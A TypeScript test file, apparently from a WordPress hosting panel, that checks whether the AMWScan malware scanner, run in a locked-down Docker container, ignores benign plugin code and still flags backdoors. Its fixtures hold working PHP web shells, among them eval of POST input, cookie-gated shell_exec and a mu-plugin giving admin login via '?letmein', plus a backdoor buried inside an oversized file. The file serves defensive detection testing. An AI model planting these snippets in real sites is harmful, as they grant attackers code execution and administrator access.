/**
 * AMWScan itself - the pinned image - with WPL7's tuning, the way a scan runs it: the real
 * scanner, the real tuning prelude and reducer, a locked-down container per run. Ordinary
 * plugin code the tuning is for stays quiet; every backdoor sample is still caught.
 *
 * Opt-in: needs Docker and the pinned image (`docker pull` the SCANNER_IMAGE digest). Run it
 * when AMWScan or the tuning moves (docs/internal/watchlist.md):
 *
 *   WPL7_ENGINE_TESTS=1 npx vitest run test/engine
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { afterAll, describe, expect, it } from 'vitest';
import type { EphemeralOpts } from '../../src/services/docker.js';
import type { ServerHandle } from '../../src/servers/registry.js';
import { MU_PLUGIN_PATH, MU_PLUGIN_SOURCE } from '../../src/services/adminLogin.js';
import { SCANNER_IMAGE, runSignatures, runZipCheck } from '../../src/services/scanEngines.js';
import { EXPLOIT_OVERRIDES } from '../../src/services/scanTuning.js';
import { zipOf } from '../helpers.js';

const ENABLED = process.env.WPL7_ENGINE_TESTS === '1';
const MIB = 1024 * 1024;

const dirs: string[] = [];
afterAll(() => {
  for (const d of dirs) fs.rmSync(d, { recursive: true, force: true });
});

/** Runs a scan container as DockerService.runEphemeral does, through the docker CLI. */
function runEphemeral(opts: EphemeralOpts) {
  const lock = opts.lockdown!;
  const args = ['run', '--rm', '--network', 'none', '--cap-drop', 'ALL', '--security-opt', 'no-new-privileges', '--read-only'];
  for (const [dir, mb] of Object.entries(lock.tmpfs)) args.push('--tmpfs', `${dir}:rw,noexec,nosuid,nodev,size=${mb}m`);
  args.push('--memory', String(lock.memoryBytes), '--memory-swap', String(lock.memoryBytes), '--pids-limit', String(lock.pidsLimit), '--cpus', '1');
  if (opts.user) args.push('--user', opts.user);
  for (const b of opts.binds ?? []) args.push('-v', b);
  if (opts.entrypoint) args.push('--entrypoint', opts.entrypoint[0]!);
  args.push(opts.image, ...(opts.entrypoint?.slice(1) ?? []), ...opts.cmd);
  const res = spawnSync('docker', args, { encoding: 'utf8', maxBuffer: 64 * MIB, timeout: opts.timeoutMs });
  return { stdout: res.stdout ?? '', stderr: res.stderr ?? '', exitCode: res.status ?? -1 };
}
const handle = { docker: { runEphemeral: async (opts: EphemeralOpts) => runEphemeral(opts) } } as unknown as ServerHandle;

/** Code the tuning is for: each tripped AMWScan in a real plugin, here in a plugin of its own. */
const QUIET: Record<string, string> = {
  // str_replace_eval: a path made relative near the top, the plugin's own eval far below.
  'wp-content/plugins/demo/lib/relative.php': [
    '<?php',
    "$relative = ltrim(str_replace($base_dir, '', $file->getPathname()), '/');",
    "if ($relative === '' || strpos($relative, '.') === 0) { return; }",
    '$files[] = $relative;',
    '$count = count($files);',
    '$total += $count;',
    'ob_start();',
    'try {',
    '  $result = eval($code);',
    '} finally { ob_end_clean(); }',
    '',
  ].join('\n'),
  // execution2: the callback is intval; the request value is array_map's.
  'wp-content/plugins/demo/admin.php': "<?php\n$ids = array_filter(array_map('intval', $_POST['allowed_users']));\nupdate_option('demo_users', $ids);\n",
  // The @preg_replace signature: a quiet regex replace, which has run no code since PHP 7.
  'wp-content/plugins/demo/lib/strings.php': "<?php\nfunction demo_squash($text) {\n    return @preg_replace('/\\s+/', ' ', $text);\n}\n",
  // Presence: what plugins call.
  'wp-content/plugins/demo/lib/run.php': "<?php\nfunction demo_run($code) {\n    assert(is_string($code));\n    exec('git --version', $out);\n    return eval($code);\n}\n",
  // The WordPress image's own wp-config line.
  'wp-config.php': "<?php\nif ($configExtra = getenv_docker('WORDPRESS_CONFIG_EXTRA', '')) {\n\teval($configExtra);\n}\n",
};

/** Backdoors, the way they are dropped into sites: every one must be found. */
const CAUGHT: Record<string, string> = {
  'wp-content/uploads/2026/10/str-replace.php': "<?php\n$c = str_replace('<?php', '', base64_decode($_POST['d']));\neval($c);\n",
  'wp-content/uploads/2026/10/str-replace2.php': '<?php\n$a = str_replace("<?", "", file_get_contents($u));\n$b = trim($a);\neval($b);\n',
  'wp-content/uploads/2026/10/callback.php': "<?php\narray_filter(array($_POST['x']), $_POST['f']);\n",
  'wp-content/uploads/2026/10/sort.php': "<?php\nusort($list, $_GET['cmp']);\n",
  'wp-content/uploads/2026/10/walk.php': "<?php\narray_walk($a, base64_decode('c3lzdGVt'));\n",
  'wp-content/uploads/2026/10/indirect.php': "<?php\n$c = $_POST['c'];\neval($c);\n",
  'wp-content/uploads/2026/10/cookie.php':
    "<?php\nif (isset($_COOKIE['k']) && md5($_COOKIE['k']) === '5f4dcc3b5aa765d61d8327deb882cf99') {\n    $cmd = $_REQUEST['cmd'];\n    echo shell_exec($cmd);\n}\n",
  'wp-content/uploads/2026/10/system.php': "<?php\n$x = $_GET['x'];\nsystem($x);\n",
  'wp-content/uploads/2026/10/assert.php': "<?php\n$f = $_POST['f'];\n$g = 'ass' . 'ert';\n$g($f);\n",
  'wp-content/uploads/2026/10/write.php': "<?php\nfile_put_contents(__DIR__ . '/x.php', $_POST['body']);\n",
  'wp-content/mu-plugins/letmein.php':
    "<?php\nadd_action('init', function () {\n    if (isset($_GET['letmein'])) {\n        $u = get_user_by('login', 'admin');\n        wp_set_current_user($u->ID);\n        wp_set_auth_cookie($u->ID);\n        wp_redirect(admin_url());\n        exit;\n    }\n});\n",
};

const BIG_SCRIPT = 'wp-content/plugins/demo/dist/app.js';

function tree(files: Record<string, string>): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'wpl7-engine-'));
  dirs.push(root);
  fs.chmodSync(root, 0o755);
  for (const [rel, text] of Object.entries(files)) {
    fs.mkdirSync(path.dirname(path.join(root, rel)), { recursive: true, mode: 0o755 });
    fs.writeFileSync(path.join(root, rel), text, { mode: 0o644 });
  }
  return root;
}

const imagePresent = () => ENABLED && spawnSync('docker', ['image', 'inspect', SCANNER_IMAGE]).status === 0;

describe.skipIf(!ENABLED)("AMWScan, the pinned image, with WPL7's tuning", () => {
  it('is there to run', () => {
    expect(imagePresent(), `docker pull ${SCANNER_IMAGE}`).toBe(true);
  });

  it('stays quiet on the code the tuning is for, and still catches every backdoor sample', async () => {
    const root = tree({ ...QUIET, ...CAUGHT, [MU_PLUGIN_PATH]: MU_PLUGIN_SOURCE, [BIG_SCRIPT]: 'var a = 1;\n'.repeat(120_000) });
    const result = await runSignatures(handle, root, { memoryBytes: 1024 * MIB, timeoutMs: 10 * 60_000, skip: [] });

    expect(result.problem).toBeNull();
    expect(result.state).toBe('complete');
    // Both overrides applied: AMWScan's patterns are still the ones they were written against.
    expect(result.tuning).toEqual({ applied: EXPLOIT_OVERRIDES.map((o) => o.name), skipped: [] });

    const byFile = new Map<string, string[]>();
    for (const f of result.findings) byFile.set(f.path, [...(byFile.get(f.path) ?? []), f.rule ?? '']);
    for (const file of Object.keys(QUIET)) expect(byFile.get(file), file).toBeUndefined();
    for (const file of Object.keys(CAUGHT)) expect(byFile.get(file)?.length ?? 0, file).toBeGreaterThan(0);
    // Every signature finding is named after the signature itself.
    expect(result.findings.filter((f) => f.rule?.startsWith('sign:')).map((f) => `${f.path} ${f.rule}`)).toEqual([]);
    // The panel's own login drop-in is the shape of a login backdoor, and the scanner says so: the
    // check holding it to its hash is what keeps it out of a site's findings.
    expect(byFile.get(MU_PLUGIN_PATH)).toEqual(['signature:dd7c6777']);
    expect(byFile.get('wp-content/mu-plugins/letmein.php')).toContain('signature:dd7c6777');

    expect(result.partial).toEqual([{ path: BIG_SCRIPT, bytes: 1_320_000 }]);
    expect(result.quieted.inert).toBe(1);
    expect(result.quieted.presence).toBeGreaterThan(0);
  }, 15 * 60_000);

  it("holds back a zip's file too large to scan whole, whatever its unread middle holds", async () => {
    // A backdoor past the start and end the scanner screens of a file this size.
    const filler = `<?php\n${'$a = 1;\n'.repeat(90_000)}`;
    const payload = `${filler}eval(base64_decode($_POST['cmd']));\n${'$b = 2;\n'.repeat(90_000)}`;
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wpl7-engine-zip-'));
    dirs.push(dir);
    const zip = path.join(dir, 'big.zip');
    fs.writeFileSync(zip, zipOf({ 'big/': '', 'big/big.php': '<?php\n/*\nPlugin Name: Big\nVersion: 1.0\n*/\n', 'big/lib/huge.php': payload }));
    fs.chmodSync(dir, 0o755);
    fs.chmodSync(zip, 0o644);
    const result = await runZipCheck(handle, zip, 'big', { memoryBytes: 512 * MIB, timeoutMs: 10 * 60_000, unpackedMb: 32 });
    expect(result.problem).toBeNull();
    expect(result.state).toBe('complete');
    expect(result.findings.map((f) => `${f.path} ${f.rule}`)).toEqual(['lib/huge.php partial:too-large']);
  }, 15 * 60_000);

  it("checks a catalog zip with the same tuning: a plugin of the code it is for comes back with nothing flagged", async () => {
    const plugin = Object.fromEntries(
      Object.entries(QUIET)
        .filter(([rel]) => rel.startsWith('wp-content/plugins/demo/'))
        .map(([rel, text]) => [rel.replace('wp-content/plugins/', ''), text]),
    );
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'wpl7-engine-zip-'));
    dirs.push(dir);
    const zip = path.join(dir, 'demo.zip');
    fs.writeFileSync(zip, zipOf({ 'demo/': '', 'demo/demo.php': '<?php\n/*\nPlugin Name: Demo\nVersion: 1.0\n*/\n', ...plugin }));
    fs.chmodSync(dir, 0o755);
    fs.chmodSync(zip, 0o644);
    const result = await runZipCheck(handle, zip, 'demo', { memoryBytes: 512 * MIB, timeoutMs: 10 * 60_000, unpackedMb: 32 });
    expect(result.problem).toBeNull();
    expect(result).toMatchObject({ state: 'complete', name: 'Demo', version: '1.0', findings: [] });
    expect(Object.keys(result.files).sort()).toEqual(['admin.php', 'demo.php', 'lib/relative.php', 'lib/run.php', 'lib/strings.php']);
  }, 15 * 60_000);
});
